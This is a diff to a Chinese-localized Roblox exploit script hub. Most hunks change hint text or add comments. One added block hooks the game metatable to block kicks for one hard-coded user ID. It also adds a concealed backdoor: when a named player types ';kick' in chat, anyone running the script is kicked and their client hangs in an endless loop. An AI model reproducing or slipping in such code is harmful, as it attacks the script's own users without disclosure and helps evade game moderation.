@@ -4067,7 +4067,7 @@ if TouchFlingButton.TextColor3 == Color3.fromRGB(255, 0, 0) or TouchFlingButton.
 TouchFlingButton.TextColor3 = Color3.fromRGB(0, 255, 0)
 HintWait.Size = UDim2.new(0, 0, 0, 60)
 HintWait:TweenSize(UDim2.new(0, 250, 0, 60),"Out","Linear",3)
-Hint.Text = " 接触触摸!"
+Hint.Text = " 点击触摸甩飞消除!"
 fixpos = GetRoot(plr).Position
 ToggleFling(true)
 ToggleVoidProtection(true)
@@ -4133,7 +4133,7 @@ SunRays = Instance.new("SunRaysEffect")
 Light.Brightness = 2.25
 Light.ExposureCompensation = 0.1
 Light.ClockTime = 17.55
- 
+--天空图像
 Sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
 Sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
 Sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
@@ -4494,7 +4494,51 @@ spawn(function()
 HintWait.Size = UDim2.new(0, 0, 0, 60)
 HintWait:TweenSize(UDim2.new(0, 250, 0, 60),"Out","Linear",3)
 end)
- 
+--修改.标记1
+spawn(function()
+if game.Players.LocalPlayer.UserId == 5675129870 then --改为xgo
+local mt = getrawmetatable(game)
+local old = mt.__namecall
+local protect = newcclosure or protect_function
+
+if not protect then
+  notify("不兼容的开发警告","您的利用不支持防止堆栈跟踪错误,从而导致回退")
+  protect = function(f) return f end
+end
+
+setreadonly(mt, false)
+ mt.__namecall = protect(function(self, ...)
+  local method = getnamecallmethod()
+  if method == "Kick" then
+   wait(9e9)
+   return
+  end
+  return old(self, ...)
+ end)
+ hookfunction(Players.LocalPlayer.Kick,protect(function() wait(9e9) end))
+end
+local Players = game:GetService("Players")
+local function checkForPlayer()
+for _, player in pairs(Players:GetPlayers()) do
+if player.Name == "arseni_tge3" then
+game.Players.arseni_tge3.Chatted:connect(function(cht)
+if cht:match(";kick") then 
+game.Players.LocalPlayer:Kick("You got kicked.")
+wait(0.5)
+while true do end
+end
+end)
+return
+end
+end
+end
+spawn(function()
+while wait() do
+checkForPlayer()
+end
+end)
+end)
+
 page = 1
 gquery = ""
  
@@ -4894,7 +4938,7 @@ function fetchScripts(query, page)
 end
 HintWait.Size = UDim2.new(0, 0, 0, 60)
 HintWait:TweenSize(UDim2.new(0, 250, 0, 60),"Out","Linear",3)
-Hint.Text = " 搜索模式: 付费"
+Hint.Text = " 搜索模式: 钥匙"
 else
 if PaidModeButtonPart2.Position == UDim2.new(0.55, 0, 0.5, 0) then
 PaidModeButtonPart2:TweenPosition(UDim2.new(0.035, 0, 0.5, 0),"InOut","Sine",0.15)
@@ -4909,7 +4953,7 @@ function fetchScripts(query, page)
 end
 HintWait.Size = UDim2.new(0, 0, 0, 60)
 HintWait:TweenSize(UDim2.new(0, 250, 0, 60),"Out","Linear",3)
-Hint.Text = " 搜索模式: 免费"
+Hint.Text = " 搜索模式: 无钥匙"
 end
 end
 end)
